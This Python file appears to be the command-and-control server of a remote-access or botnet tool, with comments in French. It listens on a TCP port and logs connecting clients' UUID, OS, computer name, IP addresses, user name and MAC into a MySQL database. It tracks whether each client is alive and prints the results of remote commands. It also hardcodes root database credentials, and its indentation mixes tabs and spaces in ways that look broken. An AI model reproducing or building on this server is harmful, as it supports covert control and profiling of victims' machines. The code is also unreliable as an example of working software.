#!/usr/bin/env python
# coding: utf-8

import socket
import time
import threading
import MySQLdb
from functions import check_alive
from threading import Thread
from functions import *
import subprocess

class ClientThread(threading.Thread):

    def __init__(self, ip, port, clientsocket):
        # Ajout des threads pour paraléliser les connexions clientes, et ainsi ne pas créer de file d'attente face au serveur
        threading.Thread.__init__(self)
        self.ip = ip
        self.port = port
        self.clientsocket = clientsocket

    def run(self):
        # Se lance à chaques nouveaux threads
        array_infos = []
        try:
            receive = self.clientsocket.recv(32768)
            alive = True
        except:
            alive = False
            pass

        if alive == True:
	    if "Init" in str(receive):
		infos = str(receive)
                for items in infos.split(','):
                    array_infos.append(items)
                    # Incrémente les infos dans une liste

		array_infos[0] = array_infos[0].replace("b'", "")
                array_infos[-1] = array_infos[-1].replace("'", "")
                # Formate les élements de la liste

		uuid = str(array_infos[1])

		db = MySQLdb.connect("localhost","root","toor","clients")
                cursor = db.cursor()
                # Init connexion à la BDD

                cursor.execute( """SELECT uuid FROM clients.clients WHERE uuid = %s""", [uuid] )
                rows = cursor.fetchall()
                # Cherche doublons UUID avant ajout en BDD
                if str(rows) == "()":
			try:
                                cursor.execute("""INSERT INTO clients.clients (last_alive,uuid,mac,aes_key) VALUE (%s,%s,%s,%s)""",(array_infos[0],array_infos[1],array_infos[2],'key'))
                                db.commit()
                                print("[+] Got a new client : " + str(array_infos))
                        except:
                                db.rollback()
                                print("[-] Impossible d'ajouter le client dans le BDD")
                        db.close()
                else:
                        print("[+] Client is back : " + str(rows)).replace("(('","")[:-5]
                # Ajoute les informations clientes dans la base de données

            if "Init2" in str(receive):
                infos = str(receive)
                for items in infos.split(','):
                    array_infos.append(items)
                    # Incrémente les infos dans une liste

                array_infos[0] = array_infos[0].replace("b'", "")
                array_infos[-1] = array_infos[-1].replace("'", "")
                # Formate les élements de la liste

                if str(array_infos[2]) == "nt":
                    array_infos[2] = "Windows"
                else:
                    array_infos[2] = "Unix"
                # Associe le bon système d'exploitation au résultat

		uuid = str(array_infos[1])

		db = MySQLdb.connect("localhost","root","toor","clients")
	        cursor = db.cursor()
       	 	# Init connexion à la BDD

		cursor.execute( """SELECT uuid FROM clients.clients WHERE uuid = %s""", [uuid] )
	        rows = cursor.fetchall()
		# Cherche doublons UUID avant ajout en BDD
        	if str(rows) == "()":
                	try:
                        	cursor.execute("""INSERT INTO clients.clients (last_alive,uuid,os,computer,lip,user,pip,mac) VALUES (%s,%s,%s,%s,%s,%s,%s,%s)""",(array_infos[0],array_infos[1],array_infos[2],array_infos[3],array_infos[4],array_infos[5],array_infos[6],'Alive'))
                        	db.commit()
                        	print("[+] Got a new client : " + str(array_infos))
	                except:
        	                db.rollback()
                	        print("[-] Impossible d'ajouter le client dans le BDD")
               		db.close()
	        else:
        	        print("[+] Client is back : " + str(rows)).replace("(('","")[:-5]
        	# Ajoute les informations clientes dans la base de données

            elif "Alive" in str(receive):
                infos = str(receive)

                for items in infos.split(','):
                    array_infos.append(items)

                if str(array_infos[2]) == "nt":
                    array_infos[2] = "Windows"
                else:
                    array_infos[2] = "Unix"

                array_infos[0] = array_infos[0].replace("b'", "")
                array_infos[-1] = array_infos[-1].replace("'", "")

		alive_date = str(array_infos[0])
		uuid = str(array_infos[1])

		db = MySQLdb.connect("localhost","root","toor","clients")
	        cursor = db.cursor()

		try:
			cursor.execute("""UPDATE clients.clients SET last_alive = %s WHERE uuid = %s""",([alive_date],[uuid]))
			cursor.execute("""UPDATE clients.clients SET status = %s WHERE uuid = %s""",('Alive',[uuid]))
			db.commit()
			print("[+] Client is alive : " + str(array_infos[1]))
		except:
			db.rollback()
			print("[-] Cannot update this alive client : " + str(array_infos))

		db.close()
		#Upgrade BDD avec dernière conenxion

	    elif "CMD:" in str(receive):
		cmd_receive = str(receive)
		print("[+] Remote command result : " + cmd_receive)

	    elif str(receive) == "Exit":
		pass
	    elif "Init" in str(receive):
		pass
	    elif "Alive" in str(receive):
                pass
            else:
                print("[-] Incorrect message format : " + str(receive))

class is_down(Thread):

        def __init__(self):
                Thread.__init__(self)

        def run(self):
		while True:
			time.sleep(30)
			check_alive()

tcpsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
tcpsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
tcpsock.bind(("", 1111))
# Socket

is_down_thread = is_down()
is_down_thread.start()

check_aes_key()

while True:
    	tcpsock.listen(10)
    	(clientsocket, (ip, port)) = tcpsock.accept()
    	# Ecoute pour de nouvelles connexions

	newthread = ClientThread(ip, port, clientsocket)
        # Lance un nouveau processus pour chaques clients

  	newthread.start()

